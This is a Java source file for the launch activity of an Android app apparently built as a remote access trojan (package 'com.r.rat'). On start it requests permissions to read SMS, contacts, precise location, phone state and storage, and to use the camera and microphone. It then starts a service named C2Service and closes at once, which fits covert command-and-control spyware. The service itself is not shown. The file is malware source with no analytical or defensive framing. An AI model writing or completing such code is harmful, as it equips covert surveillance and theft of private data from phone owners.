package com.r.rat;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.content.pm.PackageManager;
import android.Manifest;
import java.util.ArrayList;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        ArrayList<String> perms = new ArrayList<>();
        String[] want = {
            Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.POST_NOTIFICATIONS
        };
        for (String p : want)
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) perms.add(p);
        if (!perms.isEmpty() && Build.VERSION.SDK_INT >= 23)
            requestPermissions(perms.toArray(new String[0]), 1);
        startService(new Intent(this, C2Service.class));
        finish();
    }
    @Override public void onRequestPermissionsResult(int c, String[] p, int[] r) {
        startService(new Intent(this, C2Service.class)); finish();
    }
}